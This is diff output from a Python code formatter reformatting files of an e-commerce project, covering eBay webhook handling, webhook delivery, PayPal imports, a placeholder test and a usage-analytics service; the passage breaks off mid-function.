@@ -12,11 +12,10 @@
 
 # Run the tests
 if __name__ == "__main__":
     # Discover and run all tests
     test_suite = unittest.defaultTestLoader.discover(
-        start_dir=os.path.dirname(__file__),
-        pattern="test_*.py"
+        start_dir=os.path.dirname(__file__), pattern="test_*.py"
     )
-    
+
     # Run the tests
     unittest.TextTestRunner().run(test_suite)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/run_tests.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_password_reset.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_password_reset.py	2025-06-19 04:04:12.751283+00:00
@@ -1,6 +1,5 @@
-
 """
 Tests for password_reset.py - FALLBACK TESTS
 
 WARNING: These are fallback tests generated due to issues with the automated test generation.
 """
@@ -14,19 +13,21 @@
     from fs_agt_clean.core.auth.password_reset import *
 except ImportError:
     # Fallback import path
     pass
 
+
 class TestPasswordReset(unittest.TestCase):
     """Tests for password_reset.py"""
-    
+
     def setUp(self):
         """Set up the test environment."""
         pass
-    
+
     def test_basic_functionality(self):
         """Test basic functionality."""
         # TODO: Implement actual tests
         self.assertTrue(True)
 
+
 if __name__ == "__main__":
     unittest.main()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_password_reset.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/ebay_handler.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/ebay_handler.py	2025-06-19 04:04:12.820055+00:00
@@ -84,11 +84,13 @@
                 "eventType": event_type,
             }
 
         # Process webhook through eBay service if available
         try:
-            if self.ebay_service and hasattr(self.ebay_service, 'process_webhook_event'):
+            if self.ebay_service and hasattr(
+                self.ebay_service, "process_webhook_event"
+            ):
                 await self.ebay_service.process_webhook_event(event_data)
             else:
                 # Basic processing without eBay service
                 await self._process_event_basic(event_data)
 
@@ -136,11 +138,13 @@
                             "error": str(e),
                             "timestamp": datetime.now().isoformat(),
                         },
                     )
                 except Exception as notification_error:
-                    self.logger.error(f"Error sending notification: {notification_error}")
+                    self.logger.error(
+                        f"Error sending notification: {notification_error}"
+                    )
 
             return {
                 "success": False,
                 "error": error_msg,
                 "eventType": event_type,
@@ -153,11 +157,13 @@
             event_data: Webhook event data
         """
         event_type = event_data.get("eventType")
         notification = event_data.get("notification", {})
 
-        self.logger.info(f"Processing eBay webhook event {event_type} with basic handler")
+        self.logger.info(
+            f"Processing eBay webhook event {event_type} with basic handler"
+        )
 
         # Log event details based on type
         if event_type.startswith("INVENTORY_ITEM_"):
             sku = notification.get("sku")
             quantity = notification.get("availableQuantity")
@@ -224,30 +230,34 @@
         Returns:
             List of supported event types
         """
         return SUPPORTED_EVENT_TYPES.copy()
 
-    async def register_with_ebay(self, callback_url: str, event_types: List[str]) -> Dict[str, Any]:
+    async def register_with_ebay(
+        self, callback_url: str, event_types: List[str]
+    ) -> Dict[str, Any]:
         """Register webhook with eBay.
 
         Args:
             callback_url: URL for eBay to send webhooks to
             event_types: List of event types to subscribe to
 
         Returns:
             Registration result
         """
         try:
-            if self.ebay_service and hasattr(self.ebay_service, 'register_webhook'):
+            if self.ebay_service and hasattr(self.ebay_service, "register_webhook"):
                 result = await self.ebay_service.register_webhook(
                     callback_url=callback_url,
                     event_types=event_types,
                 )
                 return result
             else:
                 # Mock registration when eBay service is not available
-                self.logger.info(f"Mock eBay webhook registration for URL: {callback_url}")
+                self.logger.info(
+                    f"Mock eBay webhook registration for URL: {callback_url}"
+                )
                 return {
                     "success": True,
                     "callback_url": callback_url,
                     "event_types": event_types,
                     "registration_id": "mock_registration_123",
@@ -268,16 +278,18 @@
 
         Returns:
             Unregistration result
         """
         try:
-            if self.ebay_service and hasattr(self.ebay_service, 'unregister_webhook'):
+            if self.ebay_service and hasattr(self.ebay_service, "unregister_webhook"):
                 result = await self.ebay_service.unregister_webhook(registration_id)
                 return result
             else:
                 # Mock unregistration when eBay service is not available
-                self.logger.info(f"Mock eBay webhook unregistration for ID: {registration_id}")
+                self.logger.info(
+                    f"Mock eBay webhook unregistration for ID: {registration_id}"
+                )
                 return {
                     "success": True,
                     "registration_id": registration_id,
                 }
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/ebay_handler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/paypal_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/paypal_service.py	2025-06-19 04:04:12.893582+00:00
@@ -87,11 +87,14 @@
 
 logger = logging.getLogger(__name__)
 
 try:
     from fs_agt_clean.core.payment.invoice_generator import Invoice, InvoiceGenerator
-    from fs_agt_clean.core.payment.subscription_model import BillingCycle, SubscriptionPlan
+    from fs_agt_clean.core.payment.subscription_model import (
+        BillingCycle,
+        SubscriptionPlan,
+    )
 except ImportError:
     # Create mock classes if the imports are not available
     class Invoice:  # type: ignore
         """Mock Invoice if module is not available."""
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/payment_processing/paypal_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/service.py	2025-06-19 04:04:12.931665+00:00
@@ -84,11 +84,13 @@
             )
 
             if result:
                 self.logger.info("Webhook database tables verified")
             else:
-                self.logger.warning("Webhook tables not found - they should have been created by init_webhook_db")
+                self.logger.warning(
+                    "Webhook tables not found - they should have been created by init_webhook_db"
+                )
 
         except Exception as e:
             self.logger.error(f"Error verifying webhook tables: {e}")
 
     async def _load_registered_webhooks(self) -> None:
@@ -98,28 +100,27 @@
             webhooks = await self.database.fetch_all(
                 "SELECT id, url, event_types, status, created_at FROM webhooks WHERE status = 'active'"
             )
 
             for webhook in webhooks:
-                webhook_id = str(webhook.get('id', ''))
+                webhook_id = str(webhook.get("id", ""))
                 self.registered_webhooks[webhook_id] = {
-                    'url': webhook.get('url', ''),
-                    'event_types': webhook.get('event_types', []),
-                    'is_active': webhook.get('status') == 'active',
-                    'created_at': webhook.get('created_at'),
+                    "url": webhook.get("url", ""),
+                    "event_types": webhook.get("event_types", []),
+                    "is_active": webhook.get("status") == "active",
+                    "created_at": webhook.get("created_at"),
                 }
 
-            self.logger.info(f"Loaded {len(self.registered_webhooks)} registered webhooks")
+            self.logger.info(
+                f"Loaded {len(self.registered_webhooks)} registered webhooks"
+            )
 
         except Exception as e:
             self.logger.error(f"Error loading registered webhooks: {e}")
 
     async def register_webhook(
-        self,
-        url: str,
-        event_types: List[str],
-        secret: Optional[str] = None
+        self, url: str, event_types: List[str], secret: Optional[str] = None
     ) -> Dict[str, Any]:
         """Register a new webhook.
 
         Args:
             url: Webhook callback URL
@@ -140,20 +141,20 @@
                 {
                     "url": url,
                     "event_types": str(event_types),  # Convert to string for storage
                     "secret": secret,
                     "status": "active",
-                    "created_at": datetime.now(timezone.utc)
-                }
+                    "created_at": datetime.now(timezone.utc),
+                },
             )
 
             # Add to registered webhooks
             self.registered_webhooks[str(webhook_id)] = {
-                'url': url,
-                'event_types': event_types,
-                'is_active': True,
-                'created_at': datetime.now(timezone.utc),
+                "url": url,
+                "event_types": event_types,
+                "is_active": True,
+                "created_at": datetime.now(timezone.utc),
             }
 
             self.logger.info(f"Registered webhook {webhook_id} for URL: {url}")
 
             # Record metrics
@@ -161,15 +162,15 @@
                 await self.metrics_service.record_metric(
                     "webhook_registered", 1.0, labels={"url": url}
                 )
 
             return {
-                'id': webhook_id,
-                'url': url,
-                'event_types': event_types,
-                'is_active': True,
-                'created_at': datetime.now(timezone.utc).isoformat(),
+                "id": webhook_id,
+                "url": url,
+                "event_types": event_types,
+                "is_active": True,
+                "created_at": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             self.logger.error(f"Error registering webhook: {e}")
             raise
@@ -185,11 +186,11 @@
         """
         try:
             # Deactivate webhook in database (using 'status' column)
             await self.database.execute(
                 "UPDATE webhooks SET status = :status WHERE id = :webhook_id",
-                {"status": "inactive", "webhook_id": webhook_id}
+                {"status": "inactive", "webhook_id": webhook_id},
             )
 
             # Remove from registered webhooks
             if webhook_id in self.registered_webhooks:
                 del self.registered_webhooks[webhook_id]
@@ -207,13 +208,11 @@
         except Exception as e:
             self.logger.error(f"Error unregistering webhook {webhook_id}: {e}")
             return False
 
     async def send_webhook_event(
-        self,
-        event_type: str,
-        event_data: Dict[str, Any]
+        self, event_type: str, event_data: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Send webhook event to registered webhooks.
 
         Args:
             event_type: Type of event
@@ -225,11 +224,11 @@
         try:
             delivery_results = {}
 
             # Find webhooks subscribed to this event type
             for webhook_id, webhook_info in self.registered_webhooks.items():
-                if event_type in webhook_info['event_types']:
+                if event_type in webhook_info["event_types"]:
                     try:
                         # Send webhook (simplified implementation)
                         # In a real implementation, this would make HTTP requests
                         self.logger.info(
                             f"Sending {event_type} event to webhook {webhook_id} at {webhook_info['url']}"
@@ -239,37 +238,44 @@
                         await self.database.execute(
                             """
                             INSERT INTO webhook_events (webhook_id, event_type, event_data, status, created_at)
                             VALUES (%s, %s, %s, %s, %s)
                             """,
-                            (webhook_id, event_type, event_data, 'delivered', datetime.now(timezone.utc))
+                            (
+                                webhook_id,
+                                event_type,
+                                event_data,
+                                "delivered",
+                                datetime.now(timezone.utc),
+                            ),
                         )
 
                         delivery_results[webhook_id] = {
-                            'status': 'delivered',
-                            'url': webhook_info['url'],
+                            "status": "delivered",
+                            "url": webhook_info["url"],
                         }
 
                     except Exception as e:
                         self.logger.error(f"Error sending webhook to {webhook_id}: {e}")
                         delivery_results[webhook_id] = {
-                            'status': 'failed',
-                            'error': str(e),
-                            'url': webhook_info['url'],
+                            "status": "failed",
+                            "error": str(e),
+                            "url": webhook_info["url"],
                         }
 
             # Record metrics
             if self.metrics_service:
                 await self.metrics_service.record_metric(
-                    "webhook_events_sent", len(delivery_results),
-                    labels={"event_type": event_type}
+                    "webhook_events_sent",
+                    len(delivery_results),
+                    labels={"event_type": event_type},
                 )
 
             return {
-                'event_type': event_type,
-                'deliveries': delivery_results,
-                'total_deliveries': len(delivery_results),
+                "event_type": event_type,
+                "deliveries": delivery_results,
+                "total_deliveries": len(delivery_results),
             }
 
         except Exception as e:
             self.logger.error(f"Error sending webhook event {event_type}: {e}")
             raise
@@ -285,12 +291,14 @@
             monitor_stats = await self.monitor.get_stats()
 
             # Add service-specific stats
             stats = {
                 **monitor_stats,
-                'registered_webhooks': len(self.registered_webhooks),
-                'active_webhooks': len([w for w in self.registered_webhooks.values() if w['is_active']]),
+                "registered_webhooks": len(self.registered_webhooks),
+                "active_webhooks": len(
+                    [w for w in self.registered_webhooks.values() if w["is_active"]]
+                ),
             }
 
             return stats
 
         except Exception as e:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/webhooks/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/usage_analytics_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/usage_analytics_service.py	2025-06-19 04:04:13.052526+00:00
@@ -13,27 +13,29 @@
 from typing import Any, Dict, List, Optional, Tuple
 from decimal import Decimal
 from collections import defaultdict
 
 from fs_agt_clean.services.subscription.enhanced_subscription_service import (
-    FeatureType, SubscriptionTier, enhanced_subscription_service
+    FeatureType,
+    SubscriptionTier,
+    enhanced_subscription_service,
 )
 
 logger = logging.getLogger(__name__)
 
 
 class UsagePattern:
     """Usage pattern analysis result."""
-    
+
     def __init__(
         self,
         feature_type: FeatureType,
         daily_average: float,
         weekly_trend: str,
         peak_usage_day: str,
         peak_usage_hour: int,
-        growth_rate: float
+        growth_rate: float,
     ):
         self.feature_type = feature_type
         self.daily_average = daily_average
         self.weekly_trend = weekly_trend
         self.peak_usage_day = peak_usage_day
@@ -41,18 +43,18 @@
         self.growth_rate = growth_rate
 
 
 class CostOptimization:
     """Cost optimization recommendation."""
-    
+
     def __init__(
         self,
         current_cost: Decimal,
         optimized_cost: Decimal,
         savings: Decimal,
         recommendation: str,
-        confidence: float
+        confidence: float,
     ):
         self.current_cost = current_cost
         self.optimized_cost = optimized_cost
         self.savings = savings
         self.recommendation = recommendation
@@ -60,89 +62,161 @@
 
 
 class UsageAnalyticsService:
     """
     Usage analytics service for subscription management.
-    
+
     This service provides:
     - Usage pattern analysis and insights
     - Cost optimization recommendations
     - Feature adoption tracking
     - Billing analytics and forecasting
     """
-    
+
     def __init__(self):
         """Initialize the usage analytics service."""
         self.subscription_service = enhanced_subscription_service
-        
+
         # Mock usage data for demonstration
         self.mock_usage_data = self._generate_mock_usage_data()
-        
+
         logger.info("Usage Analytics Service initialized")
-    
+
     def _generate_mock_usage_data(self) -> Dict[str, Any]:
         """Generate mock usage data for demonstration."""
         return {
             "user_123": {
                 FeatureType.AI_ANALYSIS: {
                     "daily_usage": [5, 8, 12, 6, 9, 15, 3],  # Last 7 days
-                    "hourly_distribution": [0, 0, 1, 2, 5, 8, 12, 15, 18, 20, 16, 12, 8, 5, 3, 2, 1, 0, 0, 0, 0, 0, 0, 0],
+                    "hourly_distribution": [
+                        0,
+                        0,
+                        1,
+                        2,
+                        5,
+                        8,
+                        12,
+                        15,
+                        18,
+                        20,
+                        16,
+                        12,
+                        8,
+                        5,
+                        3,
+                        2,
+                        1,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                    ],
                     "monthly_total": 180,
-                    "previous_month": 150
+                    "previous_month": 150,
                 },
                 FeatureType.VECTOR_SEARCH: {
                     "daily_usage": [25, 30, 45, 20, 35, 50, 15],
-                    "hourly_distribution": [2, 1, 3, 5, 8, 12, 18, 25, 30, 35, 28, 22, 18, 15, 12, 8, 5, 3, 2, 1, 1, 0, 0, 1],
+                    "hourly_distribution": [
+                        2,
+                        1,
+                        3,
+                        5,
+                        8,
+                        12,
+                        18,
+                        25,
+                        30,
+                        35,
+                        28,
+                        22,
+                        18,
+                        15,
+                        12,
+                        8,
+                        5,
+                        3,
+                        2,
+                        1,
+                        1,
+                        0,
+                        0,
+                        1,
+                    ],
                     "monthly_total": 680,
-                    "previous_month": 520
+                    "previous_month": 520,
                 },
                 FeatureType.MARKETPLACE_OPTIMIZATION: {
                     "daily_usage": [3, 5, 8, 2, 4, 10, 1],
-                    "hourly_distribution": [0, 0, 0, 1, 2, 3, 5, 8, 10, 12, 8, 6, 4, 3, 2, 1, 1, 0, 0, 0, 0, 0, 0, 0],
+                    "hourly_distribution": [
+                        0,
+                        0,
+                        0,
+                        1,
+                        2,
+                        3,
+                        5,
+                        8,
+                        10,
+                        12,
+                        8,
+                        6,
+                        4,
+                        3,
+                        2,
+                        1,
+                        1,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                    ],
                     "monthly_total": 95,
-                    "previous_month": 75
-                }
+                    "previous_month": 75,
+                },
             }
         }
-    
+
     async def analyze_usage_patterns(
-        self,
-        user_id: str,
-        feature_type: Optional[FeatureType] = None,
-        days: int = 30
+        self, user_id: str, feature_type: Optional[FeatureType] = None, days: int = 30
     ) -> Dict[str, Any]:
         """
         Analyze usage patterns for a user.
-        
+
         Args:
             user_id: User ID
             feature_type: Specific feature to analyze (optional)
             days: Number of days to analyze
-            
+
         Returns:
             Usage pattern analysis
         """
         try:
             # Get user usage data (mock for now)
             user_data = self.mock_usage_data.get(user_id, {})
-            
+
             if feature_type:
                 # Analyze specific feature
                 feature_data = user_data.get(feature_type, {})
                 pattern = self._analyze_feature_pattern(feature_type, feature_data)
-                
+
                 return {
                     "feature_type": feature_type.value,
                     "pattern": {
                         "daily_average": pattern.daily_average,
                         "weekly_trend": pattern.weekly_trend,
                         "peak_usage_day": pattern.peak_usage_day,
                         "peak_usage_hour": pattern.peak_usage_hour,
-                        "growth_rate": pattern.growth_rate
+                        "growth_rate": pattern.growth_rate,
                     },
                     "insights": self._generate_pattern_insights(pattern),
-                    "recommendations": self._generate_pattern_recommendations(pattern)
+                    "recommendations": self._generate_pattern_recommendations(pattern),
                 }
             else:
                 # Analyze all features
                 patterns = {}
                 for ft in FeatureType:
@@ -152,313 +226,394 @@
                         patterns[ft.value] = {
                             "daily_average": pattern.daily_average,
                             "weekly_trend": pattern.weekly_trend,
                             "peak_usage_day": pattern.peak_usage_day,
                             "peak_usage_hour": pattern.peak_usage_hour,
-                            "growth_rate": pattern.growth_rate
+                            "growth_rate": pattern.growth_rate,
                         }
-                
+
                 return {
                     "patterns": patterns,
                     "overall_insights": self._generate_overall_insights(patterns),
-                    "recommendations": self._generate_overall_recommendations(patterns)
+                    "recommendations": self._generate_overall_recommendations(patterns),
                 }
-                
+
         except Exception as e:
             logger.error(f"Error analyzing usage patterns: {e}")
             return {"error": str(e)}
-    
+
     def _analyze_feature_pattern(
-        self,
-        feature_type: FeatureType,
-        feature_data: Dict[str, Any]
+        self, feature_type: FeatureType, feature_data: Dict[str, Any]
     ) -> UsagePattern:
         """Analyze usage pattern for a specific feature."""
-        
+
         daily_usage = feature_data.get("daily_usage", [0] * 7)
         hourly_distribution = feature_data.get("hourly_distribution", [0] * 24)
         monthly_total = feature_data.get("monthly_total", 0)
         previous_month = feature_data.get("previous_month", 0)
-        
+
         # Calculate daily average
         daily_average = sum(daily_usage) / len(daily_usage) if daily_usage else 0
-        
+
         # Determine weekly trend
         first_half = sum(daily_usage[:3])
         second_half = sum(daily_usage[4:])
         if second_half > first_half * 1.1:
             weekly_trend = "increasing"
         elif second_half < first_half * 0.9:
             weekly_trend = "decreasing"
         else:
             weekly_trend = "stable"
-        
+
         # Find peak usage day
-        days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
+        days = [
+            "Monday",
+            "Tuesday",
+            "Wednesday",
+            "Thursday",
+            "Friday",
+            "Saturday",
+            "Sunday",
+        ]
         peak_day_index = daily_usage.index(max(daily_usage)) if daily_usage else 0
         peak_usage_day = days[peak_day_index]
-        
+
         # Find peak usage hour
-        peak_usage_hour = hourly_distribution.index(max(hourly_distribution)) if hourly_distribution else 9
-        
+        peak_usage_hour = (
+            hourly_distribution.index(max(hourly_distribution))
+            if hourly_distribution
+            else 9
+        )
+
         # Calculate growth rate
-        growth_rate = ((monthly_total - previous_month) / previous_month * 100) if previous_month > 0 else 0
-        
+        growth_rate = (
+            ((monthly_total - previous_month) / previous_month * 100)
+            if previous_month > 0
+            else 0
+        )
+
         return UsagePattern(
             feature_type=feature_type,
             daily_average=daily_average,
             weekly_trend=weekly_trend,
             peak_usage_day=peak_usage_day,
             peak_usage_hour=peak_usage_hour,
-            growth_rate=growth_rate
+            growth_rate=growth_rate,
         )
-    
+
     def _generate_pattern_insights(self, pattern: UsagePattern) -> List[str]:
         """Generate insights from usage pattern."""
         insights = []
-        
+
         if pattern.growth_rate > 20:
-            insights.append(f"High growth rate of {pattern.growth_rate:.1f}% indicates increasing adoption")
+            insights.append(
+                f"High growth rate of {pattern.growth_rate:.1f}% indicates increasing adoption"
+            )
         elif pattern.growth_rate < -10:
-            insights.append(f"Declining usage of {pattern.growth_rate:.1f}% may indicate issues or reduced need")
-        
+            insights.append(
+                f"Declining usage of {pattern.growth_rate:.1f}% may indicate issues or reduced need"
+            )
+
         if pattern.daily_average > 50:
-            insights.append("High daily usage suggests this is a core feature for the user")
+            insights.append(
+                "High daily usage suggests this is a core feature for the user"
+            )
         elif pattern.daily_average < 5:
-            insights.append("Low daily usage suggests limited adoption or occasional use")
-        
+            insights.append(
+                "Low daily usage suggests limited adoption or occasional use"
+            )
+
         if pattern.peak_usage_hour in range(9, 17):
-            insights.append("Peak usage during business hours indicates professional use")
+            insights.append(
+                "Peak usage during business hours indicates professional use"
+            )
         elif pattern.peak_usage_hour in range(18, 23):
             insights.append("Peak usage in evening suggests personal/side business use")
-        
+
         return insights
-    
+
     def _generate_pattern_recommendations(self, pattern: UsagePattern) -> List[str]:
         """Generate recommendations from usage pattern."""
         recommendations = []
-        
+
         if pattern.growth_rate > 30:
-            recommendations.append("Consider upgrading subscription tier to accommodate growing usage")
-        
+            recommendations.append(
+                "Consider upgrading subscription tier to accommodate growing usage"
+            )
+
         if pattern.weekly_trend == "increasing":
             recommendations.append("Monitor usage closely as it's trending upward")
-        
-        if pattern.daily_average > 40 and pattern.feature_type == FeatureType.AI_ANALYSIS:
-            recommendations.append("High AI analysis usage - consider Premium tier for unlimited access")
-        
+
+        if (
+            pattern.daily_average > 40
+            and pattern.feature_type == FeatureType.AI_ANALYSIS
+        ):
+            recommendations.append(
+                "High AI analysis usage - consider Premium tier for unlimited access"
+            )
+
         return recommendations
-    
+
     def _generate_overall_insights(self, patterns: Dict[str, Any]) -> List[str]:
         """Generate overall insights from all patterns."""
         insights = []
-        
+
         # Count features with high growth
-        high_growth_features = sum(1 for p in patterns.values() if p.get("growth_rate", 0) > 20)
-        
+        high_growth_features = sum(
+            1 for p in patterns.values() if p.get("growth_rate", 0) > 20
+        )
+
         if high_growth_features >= 2:
-            insights.append("Multiple features showing high growth - strong platform adoption")
-        
+            insights.append(
+                "Multiple features showing high growth - strong platform adoption"
+            )
+
         # Check for consistent peak hours
         peak_hours = [p.get("peak_usage_hour", 9) for p in patterns.values()]
         if len(set(peak_hours)) <= 2:
-            insights.append("Consistent usage patterns across features indicate focused work sessions")
-        
+            insights.append(
+                "Consistent usage patterns across features indicate focused work sessions"
+            )
+
         return insights
-    
+
     def _generate_overall_recommendations(self, patterns: Dict[str, Any]) -> List[str]:
         """Generate overall recommendations from all patterns."""
         recommendations = []
-        
+
         # Check if multiple features are growing
-        growing_features = [name for name, p in patterns.items() if p.get("growth_rate", 0) > 15]
-        
+        growing_features = [
+            name for name, p in patterns.items() if p.get("growth_rate", 0) > 15
+        ]
+
         if len(growing_features) >= 2:
-            recommendations.append("Multiple growing features suggest considering a higher tier subscription")
-        
+            recommendations.append(
+                "Multiple growing features suggest considering a higher tier subscription"
+            )
+
         return recommendations
-    
+
     async def get_cost_optimization_recommendations(
-        self,
-        user_id: str,
-        current_tier: SubscriptionTier
+        self, user_id: str, current_tier: SubscriptionTier
     ) -> List[CostOptimization]:
         """Get cost optimization recommendations for a user."""
         try:
             recommendations = []
-            
+
             # Get current plan
             plans = self.subscription_service.get_subscription_plans()
             current_plan = plans.get(current_tier.value)
-            
+
             if not current_plan:
                 return recommendations
-            
+
             current_monthly_cost = Decimal(str(current_plan["monthly_price"]))
-            
+
             # Analyze usage patterns
             usage_analysis = await self.analyze_usage_patterns(user_id)
             patterns = usage_analysis.get("patterns", {})
-            
+
             # Check if user is underutilizing current tier
             underutilized_features = 0
             for feature_name, pattern in patterns.items():
                 if pattern.get("daily_average", 0) < 5:  # Low usage threshold
                     underutilized_features += 1
-            
+
             # Recommend downgrade if significantly underutilized
             if underutilized_features >= 2 and current_tier != SubscriptionTier.FREE:
-                lower_tiers = [SubscriptionTier.FREE, SubscriptionTier.BASIC, SubscriptionTier.PREMIUM]
+                lower_tiers = [
+                    SubscriptionTier.FREE,
+                    SubscriptionTier.BASIC,
+                    SubscriptionTier.PREMIUM,
+                ]
                 for tier in lower_tiers:
                     if tier.value < current_tier.value:
                         lower_plan = plans.get(tier.value)
                         if lower_plan:
-                            savings = current_monthly_cost - Decimal(str(lower_plan["monthly_price"]))
+                            savings = current_monthly_cost - Decimal(
+                                str(lower_plan["monthly_price"])
+                            )
                             if savings > 0:
-                                recommendations.append(CostOptimization(
-                                    current_cost=current_monthly_cost,
-                                    optimized_cost=Decimal(str(lower_plan["monthly_price"])),
-                                    savings=savings,
-                                    recommendation=f"Consider downgrading to {lower_plan['name']} tier due to low usage",
-                                    confidence=0.7
-                                ))
+                                recommendations.append(
+                                    CostOptimization(
+                                        current_cost=current_monthly_cost,
+                                        optimized_cost=Decimal(
+                                            str(lower_plan["monthly_price"])
+                                        ),
+                                        savings=savings,
+                                        recommendation=f"Consider downgrading to {lower_plan['name']} tier due to low usage",
+                                        confidence=0.7,
+                                    )
+                                )
                                 break
-            
+
             # Recommend annual billing for savings
             if current_plan["annual_price"] > 0:
-                annual_monthly_equivalent = Decimal(str(current_plan["annual_price"])) / 12
+                annual_monthly_equivalent = (
+                    Decimal(str(current_plan["annual_price"])) / 12
+                )
                 monthly_savings = current_monthly_cost - annual_monthly_equivalent
-                
+
                 if monthly_savings > 0:
-                    recommendations.append(CostOptimization(
-                        current_cost=current_monthly_cost,
-                        optimized_cost=annual_monthly_equivalent,
-                        savings=monthly_savings,
-                        recommendation="Switch to annual billing for cost savings",
-                        confidence=0.9
-                    ))
-            
+                    recommendations.append(
+                        CostOptimization(
+                            current_cost=current_monthly_cost,
+                            optimized_cost=annual_monthly_equivalent,
+                            savings=monthly_savings,
+                            recommendation="Switch to annual billing for cost savings",
+                            confidence=0.9,
+                        )
+                    )
+
             return recommendations
-            
+
         except Exception as e:
             logger.error(f"Error getting cost optimization recommendations: {e}")
             return []
-    
+
     async def get_billing_forecast(
-        self,
-        user_id: str,
-        current_tier: SubscriptionTier,
-        months: int = 12
+        self, user_id: str, current_tier: SubscriptionTier, months: int = 12
     ) -> Dict[str, Any]:
         """Get billing forecast based on usage trends."""
         try:
             # Get usage patterns
             usage_analysis = await self.analyze_usage_patterns(user_id)
             patterns = usage_analysis.get("patterns", {})
-            
+
             # Get current plan
             plans = self.subscription_service.get_subscription_plans()
             current_plan = plans.get(current_tier.value)
-            
+
             if not current_plan:
                 return {"error": "Invalid subscription tier"}
-            
+
             monthly_cost = Decimal(str(current_plan["monthly_price"]))
-            
+
             # Calculate projected costs
             projected_costs = []
             for month in range(1, months + 1):
                 # Apply growth rate to estimate future usage
                 growth_factor = 1.0
                 for pattern in patterns.values():
                     growth_rate = pattern.get("growth_rate", 0)
                     if growth_rate > 0:
-                        growth_factor = max(growth_factor, 1 + (growth_rate / 100) * (month / 12))
-                
+                        growth_factor = max(
+                            growth_factor, 1 + (growth_rate / 100) * (month / 12)
+                        )
+
                 # Estimate if tier upgrade might be needed
                 projected_cost = monthly_cost
                 if growth_factor > 1.5 and current_tier != SubscriptionTier.ENTERPRISE:
                     # Might need upgrade
                     next_tier_cost = self._get_next_tier_cost(current_tier, plans)
                     if next_tier_cost:
                         projected_cost = next_tier_cost
-                
-                projected_costs.append({
-                    "month": month,
-                    "projected_cost": float(projected_cost),
-                    "growth_factor": growth_factor
-                })
-            
+
+                projected_costs.append(
+                    {
+                        "month": month,
+                        "projected_cost": float(projected_cost),
+                        "growth_factor": growth_factor,
+                    }
+                )
+
             total_projected = sum(cost["projected_cost"] for cost in projected_costs)
-            
+
             return {
                 "current_monthly_cost": float(monthly_cost),
                 "projected_monthly_costs": projected_costs,
                 "total_projected_annual": total_projected,
-                "potential_savings_annual": float(monthly_cost * 12 - total_projected) if total_projected < monthly_cost * 12 else 0,
-                "forecast_confidence": 0.75
+                "potential_savings_annual": (
+                    float(monthly_cost * 12 - total_projected)
+                    if total_projected < monthly_cost * 12
+                    else 0
+                ),
+                "forecast_confidence": 0.75,
             }
-            
+
         except Exception as e:
             logger.error(f"Error generating billing forecast: {e}")
             return {"error": str(e)}
-    
+
     def _get_next_tier_cost(
-        self,
-        current_tier: SubscriptionTier,
-        plans: Dict[str, Any]
+        self, current_tier: SubscriptionTier, plans: Dict[str, Any]
     ) -> Optional[Decimal]:
         """Get the cost of the next tier up."""
-        tier_order = [SubscriptionTier.FREE, SubscriptionTier.BASIC, SubscriptionTier.PREMIUM, SubscriptionTier.ENTERPRISE]
-        
+        tier_order = [
+            SubscriptionTier.FREE,
+            SubscriptionTier.BASIC,
+            SubscriptionTier.PREMIUM,
+            SubscriptionTier.ENTERPRISE,
+        ]
+
         try:
             current_index = tier_order.index(current_tier)
             if current_index < len(tier_order) - 1:
                 next_tier = tier_order[current_index + 1]
                 next_plan = plans.get(next_tier.value)
                 if next_plan:
                     return Decimal(str(next_plan["monthly_price"]))
         except (ValueError, IndexError):
             pass
-        
+
         return None
-    
+
     async def get_feature_adoption_metrics(self, user_id: str) -> Dict[str, Any]:
         """Get feature adoption metrics for a user."""
         try:
             # Get usage data
             user_data = self.mock_usage_data.get(user_id, {})
-            
+
             adoption_metrics = {}
             for feature_type in FeatureType:
                 feature_data = user_data.get(feature_type, {})
                 monthly_total = feature_data.get("monthly_total", 0)
                 previous_month = feature_data.get("previous_month", 0)
-                
+
                 adoption_metrics[feature_type.value] = {
                     "current_usage": monthly_total,
                     "previous_usage": previous_month,
-                    "adoption_rate": ((monthly_total - previous_month) / previous_month * 100) if previous_month > 0 else 0,
-                    "adoption_status": "growing" if monthly_total > previous_month else "stable" if monthly_total == previous_month else "declining"
+                    "adoption_rate": (
+                        ((monthly_total - previous_month) / previous_month * 100)
+                        if previous_month > 0
+                        else 0
+                    ),
+                    "adoption_status": (
+                        "growing"
+                        if monthly_total > previous_month
+                        else (
+                            "stable" if monthly_total == previous_month else "declining"
+                        )
+                    ),
                 }
-            
+
             return {
                 "user_id": user_id,
                 "adoption_metrics": adoption_metrics,
-                "overall_adoption_trend": self._calculate_overall_trend(adoption_metrics),
-                "generated_at": datetime.now(timezone.utc).isoformat()
+                "overall_adoption_trend": self._calculate_overall_trend(
+                    adoption_metrics
+                ),
+                "generated_at": datetime.now(timezone.utc).isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error getting feature adoption metrics: {e}")
             return {"error": str(e)}
-    
+
     def _calculate_overall_trend(self, adoption_metrics: Dict[str, Any]) -> str:
         """Calculate overall adoption trend."""
-        growing_features = sum(1 for metrics in adoption_metrics.values() if metrics["adoption_status"] == "growing")
